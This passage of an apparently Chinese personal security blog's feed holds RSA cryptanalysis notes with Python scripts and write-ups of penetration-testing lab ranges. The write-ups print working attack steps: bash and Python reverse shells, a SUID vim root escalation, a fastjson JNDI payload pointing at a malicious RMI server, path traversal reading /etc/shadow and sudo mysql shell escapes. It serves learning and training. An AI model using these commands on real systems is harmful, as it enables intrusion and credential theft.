class="line">    d_int = <span class="built_in">int</span>(d)</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>(d_int).encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to factorize n&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Boneh-Durfee-攻击"><a href="#Boneh-Durfee-攻击" class="headerlink" title="Boneh-Durfee 攻击"></a>Boneh-Durfee 攻击</h2><p>条件 <em>d</em>&lt;n^{0.292} </p><p>太复杂了先放这里😨</p><h2 id="公因子攻击"><a href="#公因子攻击" class="headerlink" title="公因子攻击"></a>公因子攻击</h2><p>如果两个不同的 RSA 公钥 n1&#x3D;p*q1，n2&#x3D;p*q2共用了一个素因子 p，我们可以通过求 GCD恢复 p，然后分解两个模数，从而恢复私钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟两个共用素因子的 RSA 公钥</span></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q1 = getPrime(<span class="number">128</span>)</span><br><span class="line">q2 = getPrime(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">n1 = p * q1</span><br><span class="line">n2 = p * q2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别计算 c1 和 c2（加密相同明文也可以）</span></span><br><span class="line">m = <span class="string">b&quot;hello&quot;</span></span><br><span class="line">m_int = bytes_to_long(m)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m_int, e, n1)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m_int, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行攻击：找出公共素因子</span></span><br><span class="line">shared_p = gcd(n1, n2)</span><br><span class="line"><span class="keyword">assert</span> shared_p == p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分解两个模数</span></span><br><span class="line">retrieved_q1 = n1 // shared_p</span><br><span class="line">retrieved_q2 = n2 // shared_p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还原私钥 d1 和 d2</span></span><br><span class="line">phi1 = (shared_p - <span class="number">1</span>) * (retrieved_q1 - <span class="number">1</span>)</span><br><span class="line">phi2 = (shared_p - <span class="number">1</span>) * (retrieved_q2 - <span class="number">1</span>)</span><br><span class="line">d1 = inverse(e, phi1)</span><br><span class="line">d2 = inverse(e, phi2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">recovered_m1 = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line">recovered_m2 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered from n1:&quot;</span>, long_to_bytes(recovered_m1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered from n2:&quot;</span>, long_to_bytes(recovered_m2))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="RSA-Padding-Oracle-攻击"><a href="#RSA-Padding-Oracle-攻击" class="headerlink" title="RSA Padding Oracle 攻击"></a>RSA Padding Oracle 攻击</h2><p>Padding Oracle 攻击是一种针对 RSA 使用 PKCS#1 v1.5 填充模式的侧信道攻击,在不获取私钥的情况下，通过服务端的错误反馈（如 “填充无效” 或 “解密失败”）逐步解密 RSA 密文或伪造签名</p><p>PKCS#1 v1.5 的加密填充格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 02 [至少 8 字节随机非零填充] 00 [明文数据]</span><br></pre></td></tr></table></figure><p>给定密文 c，攻击者构造新密文c′&#x3D;(s**{e}*c)modn，其中 s 是缩放因子。</p><p>解密后得到 m′&#x3D;s⋅m mod  n。</p><p>通过查询 Oracle 判断 m′ 的填充是否合法，可推断 m 的范围。</p><p>并没懂😶）</p><h2 id="私钥部分信息泄露攻击"><a href="#私钥部分信息泄露攻击" class="headerlink" title="私钥部分信息泄露攻击"></a>私钥部分信息泄露攻击</h2><p>在 RSA 的 CRT（中国剩余定理）优化模式中，私钥通常存储以下参数：</p><ul><li>p,q大素数，n&#x3D;p*q</li><li>dp&#x3D;d mod (p-1)</li><li>dq&#x3D;d mod (q-1)</li><li>qinv&#x3D;q^{-1} mod p（用于快速解密）</li></ul><p>已知dp和n，可以恢复p</p><p><img src="/2025/07/16/RSA%E5%8E%9F%E7%90%86/image-20250716223820730.png" alt="image-20250716223820730"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_p_from_dp</span>(<span class="params">e, n, dp</span>):</span><br><span class="line">    m = <span class="number">2</span>  <span class="comment"># 任意数（通常选小整数）</span></span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    m_p = <span class="built_in">pow</span>(c, dp, n)</span><br><span class="line">    p = gmpy2.gcd(m_p - m, n)</span><br><span class="line">    <span class="keyword">if</span> p != <span class="number">1</span> <span class="keyword">and</span> p != n:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">123.</span>..  <span class="comment"># 模数</span></span><br><span class="line">dp = <span class="number">456.</span>..  <span class="comment"># 泄露的dp</span></span><br><span class="line">p = recover_p_from_dp(e, n, dp)</span><br><span class="line"><span class="keyword">if</span> p:</span><br><span class="line">    q = n // p</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Found p:&quot;</span>, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Found q:&quot;</span>, q)</span><br></pre></td></tr></table></figure><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p><a href="https://github.com/RsaCtfTool">RsaCtfTool</a> RSA自动化解密工具</p><p>参考 <a href="https://www.freebuf.com/articles/web/287854.html">https://www.freebuf.com/articles/web/287854.html</a></p><p>总结了一些rsa的攻击方式，题目好多，以后存一些板子</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云镜-hospital</title>
      <link href="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/"/>
      <url>/2025/07/13/%E4%BA%91%E9%95%9C-hospital/</url>
      
        <content type="html"><![CDATA[<p>终于打下了一个靶场，但是觉得自己的学习方式是不对的，一直在做但是没学到东西的感觉）</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/8.png" alt="屏幕截图 2025-07-13 105113"></p><p>参考wp,感谢大佬：</p><p><a href="https://blog.csdn.net/uuzeray/article/details/143355454">最保姆级的春秋云镜Hospital打靶笔记</a></p><p><a href="https://wz0beu.cn/%e4%ba%91%e9%95%9c-hospital/">Yuq1Ng的wp</a></p><p><a href="https://xz.aliyun.com/news/12906">先知社区</a></p><p>基本流程还是和Initial很像，又安装了很多工具啊</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>开启靶场之后，用fscan扫描漏洞</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/image-20250714213828881.png" alt="image-20250714213828881"></p><p>8080端口有Spring Boot Actuator heapdump信息泄露漏洞， 访问&#x2F;actuator&#x2F;heapdump下载到heapdump文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heapdump 文件（通常扩展名为 .hprof）是 Java 虚拟机（JVM）堆内存的快照文件，记录了某一时刻内存中存储的所有对象、类、线程等信息。它常用于 调试内存泄漏、分析应用运行状态、提取敏感信息。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump</span><br></pre></td></tr></table></figure><p>提取heapdump的敏感信息，得到了Shirokey,用shiro一把梭工具(这个工具需要用Java8运行)注入内存马，之后用蚁剑连接</p><p>无法读root目录</p><p>本地suid提权 <a href="https://blog.csdn.net/Fly_hps/article/details/80428173">介绍一下suid提权</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">反弹shell</span><br><span class="line"></span><br><span class="line">攻击者：nc -lvnp 2333</span><br><span class="line"></span><br><span class="line">靶机: bash -i &gt;&amp; /dev/tcp/ip地址/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>python反弹shell命令</p><p>web01: python3 -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“ip地址”,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“&#x2F;bin&#x2F;sh”)’</p><p>获取伪终端 python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p><p>vim.basic提权读flag1 vim.basic &#x2F;root&#x2F;flag&#x2F;flag01.txt</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/1.png" alt="1"></p><p>提权到root &#x2F;usr&#x2F;bin&#x2F;vim.basic  -c ‘:python3 import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-pc”, “reset; exec sh -p”)’</p><p>一个很重要的技巧，拿到一台主机的shell后可以上传公钥用finalshell连接，方便传文件</p><p>上传fscan到web01,继续扫</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/2.png" alt="2"></p><p>172.30.12.6:8848有nacos，先frp内网穿透挂代理，nacos nacos登录</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/3.png" alt="3"></p><p>yaml反序列化</p><p>用Nacos漏洞综合利用工具生成恶意jar包(用java8打包)</p><p>因为172.30.12.6不出网，不能上传jar包，所以把yaml-payload.jar传到web01并开启http服务，NacosExploitGUI_v4.0利用漏洞</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/9.png" alt="9"></p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/image-20250714222026237.png" alt="image-20250714222026237"></p><p>修改文件新增一个用户并加入管理员组，远程桌面连接找到flag2</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/7.png" alt="7"></p><p>当时一直登录不成功，没明白原因</p><p>接下来是172.30.12.236，bp要挂代理才能抓包</p><p>username和password是json格式</p><p>jndi_tool工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp jndi_tool.jar jndi.EvilRMIServer 8888 1099 “bash -i &gt;&amp; /dev/tcp/172.30.12.5/9595 0&gt;&amp;1”</span><br><span class="line">使用jndi_tool.jar搭建一个恶意 RMI 服务器，当目标触发 JNDI 注入漏洞时，将会反弹一个 Shell 到攻击者的服务器，在web01上运行上面的命令，同时监听 nc -lvnp 9595</span><br></pre></td></tr></table></figure><p>同时用bp将json改为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://172.30.12.5:8888/Object&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>让服务器访问 <code>rmi://172.30.12.5:8888/Object</code>，并可能加载并执行远程恶意类，实现远程命令执行</p><p>成功反弹shell</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/4.png" alt="4"></p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/5.png" alt="5"></p><p>同样上传ssh公钥或者直接改密码，可以直接连接</p><p>上传fscan扫描， 172.30.54.12是最后一台机器</p><p>需要挂两层代理，proxifier设置代理链先写第一层再写第二层，成功了</p><p>把grafanaExp传到web03</p><p>.&#x2F;grafanaExp_linux_amd64 exp -u <a href="http://172.30.54.12:3000/">http://172.30.54.12:3000</a></p><p>得到postgres的密码Postgres@123，用navicat连接</p><p>接下来是数据库提权技术，我只能参照师傅们的wp操作，最后反弹shell</p><p><img src="/2025/07/13/%E4%BA%91%E9%95%9C-hospital/6.png" alt="6"></p><h1 id="技术和工具"><a href="#技术和工具" class="headerlink" title="技术和工具"></a>技术和工具</h1><p>Shiro反序列化 <a href="https://blog.csdn.net/Fighting_hawk/article/details/125562498">https://blog.csdn.net/Fighting_hawk/article/details/125562498</a></p><p>suid提权 <a href="https://blog.csdn.net/Fly_hps/article/details/80428173">https://blog.csdn.net/Fly_hps/article/details/80428173</a></p><p>Nacos Yaml反序列化 <a href="https://github.com/charonlight/NacosExploitGUI">https://github.com/charonlight/NacosExploitGUI</a> </p><p>fastjson反序列化</p><p>数据库提权</p><p>要多想</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云镜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qax培训</title>
      <link href="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/"/>
      <url>/2025/07/08/qax%E5%9F%B9%E8%AE%AD/</url>
      
        <content type="html"><![CDATA[<p>七天的培训真的好累啊，第一天貌似在玩游戏，后面三天在打靶场，然后学了一天蓝队，最后一天讲了hvv和考试</p><p>学网安果然需要实战，打靶场的三天学到了很多东西</p><h1 id="Cyber-Fortress"><a href="#Cyber-Fortress" class="headerlink" title="Cyber Fortress"></a>Cyber Fortress</h1><p>1.靶机 172.16.12.97</p><p>端口扫描</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100411847.png" alt="image-20250708100411847"></p><p>80端口-http网页</p><p>3389端口-远程桌面</p><p>5985端口-Winrm远程管理</p><p>7001端口- 一些常见的应用服务器，比如WebLogic服务器和Tomcat服务器</p><p>Dirsearch目录扫描</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100436754.png" alt="image-20250708100436754"></p><p>访问扫出来的页面</p><p><a href="http://172.16.12.97/robots.txt">http://172.16.12.97/robots.txt</a></p><p>flag1</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250709231156645.png" alt="image-20250709231156645"></p><p><a href="http://172.16.12.97/api.php">http://172.16.12.97/api.php</a></p><p>flag2</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100505000.png" alt="image-20250708100505000"></p><p>扫描7001端口</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100540347.png" alt="image-20250708100540347"></p><p>打开<a href="http://172.16.12.97:7001/examples/">http://172.16.12.97:7001/examples/</a></p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100625464.png" alt="image-20250708100625464"></p><p>发现是kindeditor编辑器</p><p>查看版本</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100648763.png" alt="image-20250708100648763"></p><p>搜索3.5.5版本的漏洞</p><p>目录遍历漏洞 </p><p>[<a href="https://baizesec.github.io/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/KindEditor%203.4.2%263.5.5%E5%88%97%E7%9B%AE%E5%BD%95%E6%BC%8F%E6%B4%9E/]">https://baizesec.github.io/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/KindEditor%203.4.2%263.5.5%E5%88%97%E7%9B%AE%E5%BD%95%E6%BC%8F%E6%B4%9E/]</a>(<a href="https://baizesec.github.io/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/KindEditor">https://baizesec.github.io/bylibrary/漏洞库/02-编辑器漏洞/Kindeditor/KindEditor</a> 3.4.2%263.5.5列目录漏洞&#x2F;)</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100728472.png" alt="image-20250708100728472"></p><p>进入fastadmin&#x2F;public&#x2F;目录</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100818938.png" alt="image-20250708100818938"></p><p>发现flag文件，在80端口访问</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708100836404.png" alt="image-20250708100836404"></p><p>同目录下发现WNeSOgakp.php</p><p>访问<a href="http://172.16.12.97/WNeSOgakp.php/index/login">http://172.16.12.97/WNeSOgakp.php/index/login</a></p><p>弱密码admin 123456登录后台</p><p>查看源代码，搜索到flag4</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps1.jpg" alt="img"> </p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/image-20250708101949833.png" alt="image-20250708101949833"></p><p>搜索fastadmin后台漏洞，发现在线命令插件漏洞</p><p><a href="https://www.secpulse.com/archives/158403.html">https://www.secpulse.com/archives/158403.html</a></p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps2.jpg" alt="img"> </p><p>成功植入一句话木马</p><p>用蚁剑连接</p><p>Flag5</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps3.jpg" alt="img"> </p><p>新建一个用户并添加到管理员组，远程桌面连接172.16.12.97</p><p>信息收集<img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps4.jpg" alt="img"></p><p>这台机器可以连接到10网段</p><p>Fscan扫描</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps5.jpg" alt="img"> </p><p>发现128~136有服务并且有ftp服务</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps6.jpg" alt="img"> </p><p>搜索发现W1R3S靶机渗透</p><p><a href="https://blog.csdn.net/Bossfrank/article/details/130953265">https://blog.csdn.net/Bossfrank/article/details/130953265</a></p><p>为了访问10网段的主机配置代理</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps7.jpg" alt="img"> </p><p>Dirb扫目录</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps8.jpg" alt="img"> </p><p>发现是cuppa cms框架</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps9.jpg" alt="img"> </p><p>到kali中的searchsploit找找有没有cuppa这个cms的漏洞</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps10.jpg" alt="img"> </p><p>查看25971.txt</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps11.jpg" alt="img"> </p><p>发现有文件包含漏洞</p><p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p>用浏览器访问 </p><p><a href="http://10.10.10.135/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://10.10.10.135/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps12.jpg" alt="img"> </p><p>curl –data-urlencode urlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;shadow <a href="http://10.10.10.135/administrator/alerts/alertConfigField.php">http://10.10.10.135/administrator/alerts/alertConfigField.php</a></p><p>找到用户密码的hash</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps13.jpg" alt="img"> </p><p>用John密码爆破</p><p>用ssh连接主机</p><p>ssh <a href="mailto:w1r3s@10.10.10.134">w1r3s@10.10.10.134</a></p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps14.jpg" alt="img"> </p><p>Root提权</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps15.jpg" alt="img"> </p><p>查看w1r3s主机ip</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps16.jpg" alt="img"> </p><p>发现这个主机可以连接9网段</p><p>在&#x2F;var&#x2F;www&#x2F;html前端文件夹中写入一句话木马文件shell.php，使用蚁剑连接</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps17.jpg" alt="img"> </p><p>上传stoaway的linux端的agent程序，运行回环连接到靶机1</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps18.jpg" alt="img"> </p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps19.jpg" alt="img"> </p><p>proxifier中配置代理链</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps20.jpg" alt="img"> </p><p>主机访问9网段的靶机3</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps21.jpg" alt="img"> </p><p>扫描发现robots.txt，其中有flag文件</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps22.jpg" alt="img"></p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps23.jpg" alt="img"> </p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps24.jpg" alt="img"> </p><p>还发现了一个登录界面，robots.txt中有字典，进行爆破，登录</p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps25.jpg" alt="img"> </p><p><img src="/2025/07/08/qax%E5%9F%B9%E8%AE%AD/wps26.jpg" alt="img"> </p><p>我们只进入到第二层，在建立多层代理花费了很多时间</p><p><a href="https://www.freebuf.com/sectool/359841.html">stoaway建立多层代理</a></p><p>还是学到了很多东西的</p><h1 id="awd"><a href="#awd" class="headerlink" title="awd"></a>awd</h1><p><a href="https://blog.csdn.net/qq_59468567/article/details/138090062">awd总结</a></p><p>打包 tar -cvf web.tar &#x2F;var&#x2F;www&#x2F;html</p><p>解压 tar -xvf web.tar -c &#x2F;var&#x2F;www&#x2F;html</p><h2 id="蓝队"><a href="#蓝队" class="headerlink" title="蓝队"></a>蓝队</h2><p>包括比赛开始时修复漏洞，加固和应急响应</p><p>先将web目录打包拖下来用D盾扫描，删除恶意文件，用finialshell管理靶机很方便</p><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p>日志分析 文件分析 进程分析，windows系统和linux系统是有差别的</p><p>部署蜜罐hfish</p><p><a href="https://hfish.net/#/2-2-linux">https://hfish.net/#/2-2-linux</a></p><p>默认安装在&#x2F;opt目录下</p><p>新增节点要在&#x2F;opt&#x2F;hfish下运行命令</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这几天真的很累啊，虽然最后的考试确实很简单，不过还是有很多东西需要花时间再学的，放假回家一直在睡😫，振作起来啊，打靶场很费力气但真的很好玩</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云镜-Initial</title>
      <link href="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/"/>
      <url>/2025/06/13/%E4%BA%91%E9%95%9C-Initial/</url>
      
        <content type="html"><![CDATA[<p>第一次打靶场，第一次接触内网渗透，做的过程中看了很多大佬的wp，感谢:）</p><p><a href="https://blog.csdn.net/uuzeray/article/details/141316323">https://blog.csdn.net/uuzeray/article/details/141316323</a></p><p><a href="https://xz.aliyun.com/news/11561">https://xz.aliyun.com/news/11561</a></p><p><a href="https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/index.html">https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/index.html</a></p><p><a href="https://wz0beu.cn/%e4%ba%91%e9%95%9c-initial/">https://wz0beu.cn/%e4%ba%91%e9%95%9c-initial/</a></p><p>2025.6.29 终于内网穿透成功了，打靶场成功</p><p>这真的是一件很酷的事情，我大概都只是照着师傅的wp在重复，要多学些东西才行呀</p><h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><p>用fscan扫描靶场ip,有thinkphp5.0.23RCE,用工具一把梭</p><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/6.png" alt="6"></p><p>添加了一个webshell,可以用蚁剑连接</p><p>读&#x2F;root目录要提权</p><p><a href="https://www.huangmj.com/17116743651246.html#36-sudo-mysql">linux sudo提权方法</a></p><p>mysql的sudo提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">sudo mysql -e &#x27;\! find / -type f -name &#x27;*flag*&#x27; 2&gt;/dev/null&#x27;</span><br><span class="line">sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/1.png" alt="1"></p><p>拿到了第一个flag</p><p>上传fscan扫描一下</p><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/2.png" alt="2"></p><p>172.22.1.2是域控，172.22.1.18有web服务，172.22.1.21有永恒之蓝</p><p>用内网穿透访问内网，我用的0.44的frp,因为不会写frpc.toml</p><p>附内网穿透教程😀</p><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.jpg" alt="内网穿透"></p><p>测试访问平台172.22.1.18</p><p><img src="/2025/06/13/%E4%BA%91%E9%95%9C-Initial/3.png" alt="3"></p><p>后台rce：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 